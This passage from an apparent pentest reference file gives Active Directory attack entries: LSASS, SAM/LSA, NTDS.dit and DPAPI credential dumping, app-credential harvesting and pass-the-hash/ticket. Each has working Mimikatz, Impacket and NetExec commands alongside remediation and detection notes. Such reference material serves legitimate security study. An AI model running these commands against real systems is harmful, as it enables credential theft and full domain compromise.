              ["1", "Steal key material (DCSync krbtgt / dump a service key)", "The signing key for forgery"],
              ["2", "Forge the appropriate ticket", "Golden (domain) / Silver (one service)"],
              ["3", "Pass-the-ticket into a session", "Authenticated as the impersonated principal"],
              ["4", "Act (DCSync, PsExec, data access)", "Domain-wide control / persistence"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket ticketer.py", "Forge Golden/Silver tickets"],
              ["Rubeus", "diamond/golden/silver, ptt, asktgt (overpass-the-hash)"],
              ["Mimikatz", "kerberos::golden, sekurlsa::pth, ptt"],
              ["Impacket getTGT.py / secretsdump", "Overpass-the-hash and obtain krbtgt"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1558.001 — Golden Ticket", url: "https://attack.mitre.org/techniques/T1558/001/" },
              { label: "The Hacker Recipes — Forged tickets", url: "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Protect the krbtgt key; rotate it twice (with a replication interval) after any suspected Tier-0 compromise.",
              "Isolate Tier-0 credentials so TGTs and service keys cannot be stolen from ordinary workstations.",
              "Keep Kerberos ticket lifetimes short; enable Credential Guard to make key extraction from LSASS far harder.",
              "Detect: tickets used with no matching 4768/4769 request on the DC (Golden/Silver), anomalous ticket lifetimes, and impossible group claims in the PAC.",
              "Silver Tickets are hardest to detect — enforce SMB signing and monitor service-account behaviour."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Credential Access",
    vulns: [
      {
        id: "lsass-dumping",
        name: "LSASS Memory Dumping",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/001/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "The LSASS process caches the secrets of logged-on users — dumping its memory yields NT hashes, Kerberos tickets, and sometimes cleartext.",
        brief: "The Local Security Authority Subsystem Service (LSASS) holds the credential material of every interactive session on a host: NT hashes, Kerberos tickets and keys, and — with legacy providers like WDigest — sometimes cleartext passwords. Any local administrator / SYSTEM context can read that memory.\n\nImpact: dumping LSASS on a single server that admins log into commonly yields a Domain Admin credential, which is why it is the pivot from local admin to domain compromise.",
        quickReference: [
          { label: "Mimikatz — dump logon passwords", cmd: "privilege::debug\nsekurlsa::logonpasswords" },
          { label: "Living-off-the-land dump (comsvcs.dll)", cmd: "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full" },
          { label: "Remote via NetExec", cmd: "netexec smb 10.10.10.10 -u admin -p 'Passw0rd' --lsa\nnetexec smb 10.10.10.10 -u admin -p 'Passw0rd' -M lsassy" },
          { label: "Parse an offline dump", cmd: "mimikatz # sekurlsa::minidump lsass.dmp   then  sekurlsa::logonpasswords\npypykatz lsa minidump lsass.dmp" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. From a SYSTEM/admin context, dump logon secrets with Mimikatz", cmd: "mimikatz.exe\nprivilege::debug          # acquire SeDebugPrivilege\nsekurlsa::logonpasswords  # NT hashes, Kerberos keys, WDigest cleartext if present\nsekurlsa::ekeys           # AES keys for overpass-the-hash / pass-the-key" },
              { label: "2. Stealthier: dump the process, exfil, parse offline (no mimikatz on host)", cmd: "# built-in Windows binary, no third-party tool on disk\nrundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full\n# then offline on your box:\npypykatz lsa minidump lsass.dmp" },
              { label: "3. Remote, at scale", cmd: "# NetExec dumps LSASS across hosts and parses automatically\nnetexec smb targets.txt -u admin -p 'Passw0rd' -M lsassy\n# nanodump / dumpert evade some AV by avoiding MiniDumpWriteDump" },
              { label: "4. Re-enable WDigest to force cleartext caching (noisy)", cmd: "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\n# on the next logon, sekurlsa::logonpasswords returns cleartext" },
              { label: "5. Use the recovered material", cmd: "# NT hash -> pass-the-hash ; AES key -> pass-the-key ; TGT -> pass-the-ticket\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe" }
            ]
          },
          {
            title: "What LSASS Yields",
            type: "table",
            columns: ["Artifact", "Use"],
            rows: [
              ["NT hash", "Pass-the-hash, offline cracking"],
              ["Kerberos AES/RC4 keys (ekeys)", "Overpass-the-hash / pass-the-key"],
              ["Kerberos tickets (TGT/TGS)", "Pass-the-ticket"],
              ["WDigest cleartext", "Direct password (legacy/enabled systems)"],
              ["DPAPI master keys", "Decrypt DPAPI-protected secrets"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain local admin / SYSTEM on a host", "Right to read LSASS memory"],
              ["2", "Dump LSASS (mimikatz / comsvcs / nanodump)", "Credential material of logged-on users"],
              ["3", "Parse for hashes, keys, tickets", "Reusable secrets"],
              ["4", "If a privileged user was logged on", "Domain Admin credential"],
              ["5", "Pass-the-hash / ticket onward", "Lateral movement → domain compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Mimikatz", "sekurlsa::logonpasswords/ekeys, pth"],
              ["comsvcs.dll (LOLBin) / nanodump / dumpert", "Create an LSASS dump, evade AV"],
              ["pypykatz", "Parse a minidump offline on Linux"],
              ["NetExec (lsassy / --lsa)", "Remote dump + parse at scale"],
              ["procdump (Sysinternals)", "Signed binary to dump the process"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.001 — LSASS Memory", url: "https://attack.mitre.org/techniques/T1003/001/" },
              { label: "The Hacker Recipes — Dumping credentials", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enable LSA Protection (RunAsPPL) so LSASS runs as a protected process and cannot be read by normal admin tools.",
              "Deploy Credential Guard to isolate secrets in a VBS-protected container away from LSASS.",
              "Disable WDigest (UseLogonCredential = 0) so cleartext is never cached.",
              "Enforce tiered administration so Domain Admins never log on to lower-tier servers where LSASS can be dumped.",
              "Detect: handle opens to lsass.exe by non-system processes, comsvcs MiniDump usage, and creation of *.dmp of LSASS (EDR/Sysmon)."
            ]
          }
        ]
      },
      {
        id: "sam-lsa-secrets",
        name: "SAM & LSA Secrets",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1003/002/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "The local SAM stores local account hashes; LSA secrets store service-account passwords and cached domain credentials — all readable with local admin.",
        brief: "Every Windows host keeps local account NT hashes in the SAM registry hive and stores machine/service secrets (service-account passwords, auto-logon credentials, and cached domain logons) under LSA secrets. With local admin you can extract all of it, offline or remotely.\n\nImpact: a reused local administrator hash enables pass-the-hash across every machine that shares it; LSA secrets frequently hand over a service account's cleartext password; cached domain credentials can be cracked to recover a domain user's password even when the DC is unreachable.",
        quickReference: [
          { label: "Dump SAM + LSA + cached (offline hives)", cmd: "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv & reg save HKLM\\SECURITY sec.hiv\nsecretsdump.py -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL" },
          { label: "Remote (Impacket)", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@10.10.10.10" },
          { label: "NetExec", cmd: "netexec smb 10.10.10.10 -u admin -p 'Passw0rd' --sam --lsa" },
          { label: "Crack cached domain creds (mscash2)", cmd: "hashcat -m 2100 dcc2.txt rockyou.txt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Save the registry hives (offline extraction avoids touching LSASS)", cmd: "reg save HKLM\\SAM     C:\\temp\\sam.hiv\nreg save HKLM\\SYSTEM  C:\\temp\\system.hiv    # holds the boot key to decrypt SAM\nreg save HKLM\\SECURITY C:\\temp\\security.hiv  # LSA secrets + cached creds" },
              { label: "2. Extract everything offline", cmd: "secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n#   local account NT hashes (SAM)\n#   $MACHINE.ACC and service secrets (LSA)\n#   $DCC2$ cached domain logons" },
              { label: "3. Or pull it remotely in one command", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@10.10.10.10\nnetexec smb 10.10.10.0/24 -u admin -H <local_admin_hash> --sam --lsa" },
              { label: "4. Reuse the local admin hash (if shared across the fleet)", cmd: "netexec smb 10.10.10.0/24 -u administrator -H <sam_nt_hash> --local-auth\n# a shared local admin password = pass-the-hash to every host (see LAPS remediation)" },
              { label: "5. Crack cached domain credentials for a real domain password", cmd: "hashcat -m 2100 \"\\$DCC2\\$10240#user#<hash>\" rockyou.txt\n# mscash2 is slow to crack but recovers a usable domain password when it falls" }
            ]
          },
          {
            title: "What Each Store Holds",
            type: "table",
            columns: ["Store", "Contents"],
            rows: [
              ["SAM", "Local account NT hashes (e.g. the local Administrator)"],
              ["LSA secrets", "Service-account passwords, auto-logon creds, machine account key"],
              ["Cached domain creds (DCC2)", "Last N domain logons — crackable offline (hashcat 2100)"],
              ["Boot key (SYSTEM hive)", "Required to decrypt the SAM"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Local admin on a host", "Read SAM/SECURITY/SYSTEM"],
              ["2", "Extract SAM + LSA + cached", "Local hashes, service secrets, DCC2"],
              ["3", "Pass-the-hash the local admin (if shared)", "Fleet-wide lateral movement"],
              ["4", "Crack LSA/service secret or DCC2", "Cleartext service/domain password"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket secretsdump.py", "Local (-sam/-system/-security) or remote extraction"],
              ["NetExec", "--sam --lsa across a subnet"],
              ["reg save / reg.exe", "Save the hives for offline parsing"],
              ["Mimikatz lsadump::sam / lsadump::secrets", "Windows-side extraction"],
              ["hashcat", "Crack cached domain creds (mode 2100)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.002 — Security Account Manager", url: "https://attack.mitre.org/techniques/T1003/002/" },
              { label: "The Hacker Recipes — SAM & LSA secrets", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Deploy LAPS so every host has a unique, rotated local administrator password — this breaks fleet-wide pass-the-hash of the local admin.",
              "Limit cached domain logons (CachedLogonsCount) on servers that do not need offline logon.",
              "Protect service accounts with gMSA so their LSA-stored secret is not a crackable static password.",
              "Restrict local admin rights; the whole technique requires them.",
              "Detect: reg save of SAM/SECURITY/SYSTEM, remote registry access, and secretsdump-style SMB activity."
            ]
          }
        ]
      },
      {
        id: "ntds-extraction",
        name: "NTDS.dit Extraction",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/003/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "The domain database NTDS.dit holds every domain account's hashes — extracting it from a DC yields the entire domain's credentials.",
        brief: "On a domain controller, NTDS.dit is the directory database, and it contains the password hashes (and Kerberos keys) of every account in the domain — including krbtgt and every Domain Admin. With DC admin, an attacker copies it (via Volume Shadow Copy to dodge the file lock) and extracts the lot offline.\n\nImpact: this is total domain compromise. Unlike DCSync (which pulls specific accounts over the replication protocol), NTDS extraction takes the whole database at once — every hash, every Kerberos key.",
        quickReference: [
          { label: "Remote (Impacket, uses DRSUAPI or VSS)", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@dc01 -just-dc" },
          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p 'Passw0rd' --ntds" },
          { label: "On-DC: shadow copy + grab the files", cmd: "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ifm\" q q" },
          { label: "Parse offline (ntds + system hive)", cmd: "secretsdump.py -ntds ntds.dit -system system.hiv LOCAL" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. On the DC, create an offline copy (VSS avoids the live-file lock)", cmd: "# ntdsutil IFM writes a consistent copy of NTDS.dit + the SYSTEM hive\nntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ifm\" quit quit\n# alt: vssadmin create shadow /for=C: then copy \\\\?\\GLOBALROOT\\...\\NTDS\\ntds.dit" },
              { label: "2. Exfil the two files and extract offline", cmd: "secretsdump.py -ntds C:\\temp\\ifm\\Active Directory\\ntds.dit \\\n  -system C:\\temp\\ifm\\registry\\SYSTEM LOCAL -outputfile domain_hashes\n# dumps every account's NTLM hash and Kerberos keys" },
              { label: "3. Or pull it remotely without shell interaction", cmd: "secretsdump.py corp.local/admin:'Passw0rd'@dc01 -just-dc\n#   -just-dc          only the domain secrets (uses DRSUAPI replication or VSS)\n#   -just-dc-ntlm     hashes only ; -just-dc-user krbtgt for one account" },
              { label: "4. Use the crown jewels", cmd: "# krbtgt hash -> Golden Ticket ; DA hash -> pass-the-hash ; crack the rest offline\nhashcat -m 1000 domain_hashes.ntds rockyou.txt   # NTLM" }
            ]
          },
          {
            title: "NTDS vs DCSync",
            type: "table",
            columns: ["Aspect", "Detail"],
            rows: [
              ["NTDS.dit extraction", "Copies the whole database file — every account at once"],
              ["DCSync", "Pulls chosen accounts over MS-DRSR replication, no file access"],
              ["Requires", "DC admin (NTDS) vs replication rights on the domain (DCSync)"],
              ["Both yield", "krbtgt, all DA hashes, Kerberos keys — total compromise"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Gain admin on a domain controller", "Access to NTDS.dit"],
              ["2", "Shadow-copy / IFM the database + SYSTEM hive", "Consistent offline copy"],
              ["3", "Extract hashes offline (secretsdump)", "Every domain account's hash + keys"],
              ["4", "Golden Ticket from krbtgt / PtH the DA", "Durable, total domain control"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket secretsdump.py", "-just-dc remote, or -ntds offline parsing"],
              ["NetExec", "--ntds convenience wrapper"],
              ["ntdsutil / vssadmin", "Create a shadow copy of the locked database on the DC"],
              ["Mimikatz / DSInternals", "Windows-side NTDS parsing"],
              ["hashcat", "Crack the recovered NTLM hashes (mode 1000)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.003 — NTDS", url: "https://attack.mitre.org/techniques/T1003/003/" },
              { label: "The Hacker Recipes — NTDS extraction", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Treat domain controllers as Tier-0: minimise who has DC admin, and manage them from a privileged access workstation only.",
              "Rotate krbtgt twice after any suspected DC compromise; assume every hash in the domain is burned.",
              "Monitor Volume Shadow Copy creation, ntdsutil IFM, and access to ntds.dit on DCs.",
              "Detect DRSUAPI replication from non-DC hosts (the DCSync path) as well as raw file copies.",
              "Enforce strong, unique passwords and consider periodic domain-wide password resets after an incident."
            ]
          }
        ]
      },
      {
        id: "dpapi-abuse",
        name: "DPAPI Abuse",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1555/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "Windows' Data Protection API encrypts browser passwords, saved RDP/Wi-Fi creds and vault secrets — the keys are recoverable, so the secrets are too.",
        brief: "DPAPI transparently encrypts per-user secrets — browser passwords and cookies, saved RDP and Wi-Fi credentials, Credential Manager vault entries, and application secrets. It is protected by a master key derived from the user's password, and domain-wide by a DPAPI backup key held on the DCs.\n\nImpact: with the user's password/hash, local admin, or the domain backup key, an attacker decrypts all of it. The domain backup key is the jackpot: one .pvk from the DC decrypts every domain user's DPAPI secrets on every host, frequently exposing credentials to systems and third parties outside AD entirely.",
        quickReference: [
          { label: "Extract the DPAPI domain backup key (with DA)", cmd: "dpapi.py backupkeys -t corp.local -u admin -p 'Passw0rd' --export" },
          { label: "Harvest at scale with the backup key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk -u admin -p 'Passw0rd' -d corp.local" },
          { label: "Mimikatz — decrypt a masterkey then a blob", cmd: "dpapi::masterkey /in:<masterkey> /rpc\ndpapi::cred /in:<credential_blob>" },
          { label: "SharpDPAPI (browser/vault/RDP)", cmd: "SharpDPAPI.exe triage" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. The jackpot: extract the DPAPI domain backup key once (needs DA)", cmd: "dpapi.py backupkeys -t corp.local -u admin -p 'Passw0rd' --export\n# writes a .pvk that decrypts EVERY domain user's DPAPI secrets, on any host, forever" },
              { label: "2. Sweep hosts and decrypt everything with that key", cmd: "donpapi collect -t targets.txt --pvk domain_backupkey.pvk \\\n  -u admin -p 'Passw0rd' -d corp.local\n# browser passwords/cookies, Credential Manager, RDP, Wi-Fi, scheduled-task creds" },
              { label: "3. Without the backup key: decrypt with the user's password/hash locally", cmd: "# masterkey is unlocked by the user's password (or their SHA1/NT hash)\nmimikatz # dpapi::masterkey /in:\"%APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>\" /password:UserPass\nmimikatz # dpapi::cred /in:\"%APPDATA%\\Microsoft\\Credentials\\<blob>\"" },
              { label: "4. Triage a compromised host quickly", cmd: "SharpDPAPI.exe triage        # dumps Credential Manager, vaults, RDP\nSharpChrome.exe logins       # Chrome/Edge saved passwords and cookies" },
              { label: "5. Pivot outward", cmd: "# recovered secrets often reach cloud consoles, VPNs, and partner systems\n# outside the AD boundary — a scope note, not just a domain finding" }
            ]
          },
          {
            title: "Decryption Paths",
            type: "table",
            columns: ["Method", "When it applies"],
            rows: [
              ["User password / NT hash", "Decrypts that user's master keys and everything under them"],
              ["DPAPI domain backup key (.pvk)", "Decrypts every domain user's DPAPI data on any host — the jackpot"],
              ["Local SYSTEM", "Machine-scope DPAPI secrets (e.g. some service creds)"],
              ["Why the backup key wins", "One key, domain-wide, no per-user password needed"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reach DA (or a user's password/hash, or local admin)", "A viable decryption path"],
              ["2", "Extract the domain backup key (best case)", "Domain-wide DPAPI master key"],
              ["3", "Sweep hosts and decrypt DPAPI blobs", "Browser/RDP/Wi-Fi/vault credentials"],
              ["4", "Reuse recovered creds", "Access to internal + external systems"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket dpapi.py", "Extract the domain backup key; decrypt masterkeys/blobs"],
              ["DonPAPI", "Remote, scaled DPAPI harvesting with the backup key"],
              ["Mimikatz (dpapi::)", "Decrypt masterkeys, credentials, vaults"],
              ["SharpDPAPI / SharpChrome", "Triage browser, vault, RDP secrets on Windows"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1555 — Credentials from Password Stores", url: "https://attack.mitre.org/techniques/T1555/" },
              { label: "The Hacker Recipes — DPAPI", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Protect domain controllers — the DPAPI backup key lives there and is domain-wide game over if stolen.",
              "Discourage browser password storage for privileged accounts; use a managed password manager instead.",
              "Rotate credentials broadly after a DA compromise, including secrets that DPAPI protected (cloud, VPN, third-party).",
              "Deploy Credential Guard and LSA protection to limit the material an attacker can reach in the first place.",
              "Detect: access to the DPAPI backup key on DCs, and mass reads of \\AppData\\...\\Protect and \\Credentials across hosts."
            ]
          }
        ]
      },
      {
        id: "stored-cred-harvest",
        name: "Stored / Application Credential Harvesting",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1552/",
        theory: "theory/2026-08-18-windows-credential-storage.html",
        description: "Installed applications save passwords insecurely — FTP/SSH clients, email, IM, database tools and saved RDP/PuTTY sessions all give up credentials to a local harvester.",
        brief: "Beyond OS credential stores, ordinary applications persist passwords: FTP/SFTP clients (FileZilla, WinSCP, CoreFTP), SSH sessions (PuTTY/SuperPuTTY), email and IM clients, database GUIs (HeidiSQL), VNC, and saved RDP sessions. Many store them weakly (registry, XML, reversible encryption).\n\nImpact: harvesting these on a single foothold routinely yields credentials to file servers, databases, network devices, and other users' systems — often the fastest lateral-movement fuel available, requiring only user-level access to that profile.",
        quickReference: [
          { label: "LaZagne — dump everything on the host", cmd: "lazagne.exe all" },
          { label: "SessionGopher — saved RDP/WinSCP/PuTTY/FileZilla sessions", cmd: "Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough" },
          { label: "Metasploit post modules", cmd: "use post/windows/gather/credentials/winscp   (also filezilla_client_cred, coreftp, vnc, heidisql, ...)" },
          { label: "Nirsoft utilities", cmd: "Mail PassView, PstPassword, WebBrowserPassView, VNCPassView" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Broad sweep with LaZagne (user context is enough)", cmd: "lazagne.exe all\n# harvests browsers, FTP/SSH clients, email, IM, databases, Wi-Fi, sysadmin tools\nlazagne.exe browsers -oN   # scope to a category, output to file" },
              { label: "2. Saved remote-session credentials with SessionGopher", cmd: "powershell -ep bypass\nImport-Module .\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n# RDP .rdp, WinSCP, PuTTY/SuperPuTTY, FileZilla saved sessions & passwords\nInvoke-SessionGopher -AllDomain -o   # sweep the whole domain remotely" },
              { label: "3. Metasploit post-exploitation modules (from an existing session)", cmd: "use post/windows/gather/credentials/winscp\nset session 1\nexploit\n# also: filezilla_client_cred, coreftp, ftpnavigator, vnc, heidisql, pidgin_cred" },
              { label: "4. Nirsoft point tools for specific apps", cmd: "# email: Mail PassView ; Outlook PST: PstPassword ; browsers: WebBrowserPassView\n# VNC: VNCPassView — each recovers cleartext from that app's store" },
              { label: "5. Reuse immediately for lateral movement", cmd: "# a recovered WinSCP/SSH cred to a file server, or a DB GUI cred, is a direct pivot\nnetexec smb fileserver -u <found_user> -p '<found_pass>'" }
            ]
          },
          {
            title: "Where Applications Hide Secrets",
            type: "table",
            columns: ["Application", "Storage / weakness"],
            rows: [
              ["WinSCP", "Registry / .ini, reversibly encrypted (or plaintext)"],
              ["FileZilla", "sitemanager.xml / recentservers.xml, base64/plaintext"],
              ["PuTTY / SuperPuTTY", "Registry sessions; SuperPuTTY XML can hold passwords"],
              ["CoreFTP / FTP Navigator", "Registry, weak encryption"],
              ["HeidiSQL / DB GUIs", "Saved connection passwords"],
              ["Saved RDP (.rdp)", "DPAPI-protected password (see DPAPI Abuse)"],
              ["VNC", "Registry, reversible fixed-key encryption"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Land on a user's workstation/server", "Access to their app profiles"],
              ["2", "Run LaZagne / SessionGopher / MSF modules", "Cleartext app credentials"],
              ["3", "Identify creds to other hosts/services", "Movement targets"],
              ["4", "Authenticate to those targets", "Lateral movement / privilege gain"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["LaZagne", "Broad multi-application credential recovery"],
              ["SessionGopher", "Saved RDP/WinSCP/PuTTY/FileZilla sessions"],
              ["Metasploit post/*/credentials/*", "Per-application dump modules"],
              ["Nirsoft (Mail PassView, PstPassword, ...)", "Point recovery for specific apps"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1552 — Unsecured Credentials", url: "https://attack.mitre.org/techniques/T1552/" },
              { label: "HackingArticles — Credential Dumping series", url: "https://www.hackingarticles.in/credential-dumping/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Discourage 'save password' in FTP/SSH/DB clients on privileged or shared systems; use a vaulted password manager.",
              "Prefer key-based auth (SSH keys with passphrases, certificate auth) over stored passwords.",
              "Restrict interactive logon and admin rights so a single foothold does not expose many stored credentials.",
              "Rotate any credential that could have been harvested after a host compromise.",
              "Detect: execution of LaZagne/SessionGopher, and reads of known application credential files/registry keys."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Lateral Movement",
    vulns: [
      {
        id: "pass-the-hash",
        name: "Pass-the-Hash / Pass-the-Ticket",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1550/002/",
        theory: "theory/2026-08-18-ntlm.html",
        description: "Reuse a stolen NT hash, Kerberos ticket, or key to authenticate as a user without ever knowing their password.",
        brief: "Windows authentication proves knowledge of a secret derived from the password, not the password itself — so a stolen NT hash (NTLM), Kerberos ticket, or Kerberos key is a credential you can replay directly. Pass-the-Hash reuses the NT hash; Pass-the-Ticket injects a stolen TGT/TGS; Overpass-the-Hash turns an NT hash into a fresh TGT; Pass-the-Key uses the AES key.\n\nImpact: these convert a single credential-dump into movement across every host that trusts that identity, without cracking anything. A reused local admin hash or a captured Domain Admin ticket spreads laterally at will.",
        quickReference: [
          { label: "Pass-the-Hash to a shell", cmd: "psexec.py -hashes :<nthash> corp.local/Administrator@10.10.10.10" },
          { label: "PtH validate/spray across a subnet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth" },
          { label: "Overpass-the-Hash (NT hash → TGT)", cmd: "getTGT.py corp.local/svc -hashes :<nthash> ; export KRB5CCNAME=svc.ccache" },
          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=stolen.ccache ; psexec.py -k -no-pass target" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Pass-the-Hash — authenticate with the NT hash directly", cmd: "# any Impacket exec tool accepts -hashes LM:NT (LM can be empty)\npsexec.py -hashes :2777b7fec870e04dda00cd7260f7bee6 corp.local/Administrator@10.10.10.10\n# evil-winrm: evil-winrm -i host -u Administrator -H <nthash>" },
              { label: "2. Spray a (possibly shared local-admin) hash across the fleet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth\n# (Pwn3d!) marks hosts where the hash grants admin — instant lateral map" },
              { label: "3. Overpass-the-Hash — mint a real Kerberos TGT from the NT hash", cmd: "getTGT.py corp.local/administrator -hashes ':<nthash>' -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache\npsexec.py -k -no-pass corp.local/administrator@dc01.corp.local\n# from here you are using Kerberos, which blends in better than raw NTLM" },
              { label: "4. Pass-the-Key — use the AES256 key instead of the NT hash", cmd: "getTGT.py corp.local/administrator -aesKey <aes256_key> -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache   # AES avoids RC4 downgrade detections" },
              { label: "5. Pass-the-Ticket — inject a ticket you stole from memory", cmd: "# Rubeus.exe dump  ->  base64 TGT  ->  Rubeus.exe ptt /ticket:<b64>\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
            ]
          },
          {
            title: "Credential-Reuse Variants",
            type: "table",
            columns: ["Technique", "Secret used"],
            rows: [
              ["Pass-the-Hash", "NT hash → NTLM authentication"],
              ["Overpass-the-Hash", "NT hash → request a real Kerberos TGT"],
              ["Pass-the-Key", "AES128/256 key → request a TGT (stealthier than RC4)"],
              ["Pass-the-Ticket", "A stolen TGT/TGS → inject and reuse directly"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Dump a hash/ticket/key (see Credential Access)", "A reusable secret"],
              ["2", "Validate where it grants access (NetExec spray)", "Map of reachable hosts"],
              ["3", "PtH/PtT into a target (psexec/wmiexec/evil-winrm)", "Code execution as the identity"],
              ["4", "Repeat toward higher privilege", "Path to Domain Admin"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket psexec/wmiexec/getTGT", "PtH, overpass-the-hash, pass-the-key execution"],
              ["NetExec", "Spray hashes to map admin access (--local-auth / -H)"],
              ["Rubeus", "dump/ptt (pass-the-ticket), asktgt (overpass-the-hash)"],
              ["Mimikatz", "sekurlsa::pth, kerberos::ptt"],
              ["evil-winrm", "-H to pass-the-hash over WinRM"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1550.002 — Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" },
              { label: "The Hacker Recipes — Pass-the-hash / ticket", url: "https://www.thehacker.recipes/ad/movement/ntlm/pth" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Deploy LAPS so a stolen local-admin hash cannot be reused on other hosts.",
              "Enforce tiered administration so a captured Tier-0 hash/ticket is never present on a Tier-2 workstation.",
              "Enable Credential Guard and LSA Protection to make hashes/tickets harder to steal in the first place.",
              "Block/limit NTLM where possible and prefer Kerberos; monitor for RC4 overpass-the-hash (encryption downgrade).",
              "Detect: the same account authenticating to many hosts rapidly, and TGT requests from unusual hosts (event 4768/4624 type 3/9)."
            ]
          }
        ]
      },
      {
        id: "remote-execution",
        name: "Remote Service Execution (PsExec / WMI / WinRM / RDP)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1021/",
        theory: "theory/2026-08-18-ntlm.html",
        description: "Given valid credentials or a hash, execute code on remote hosts through SMB service creation, WMI, WinRM, or RDP.",
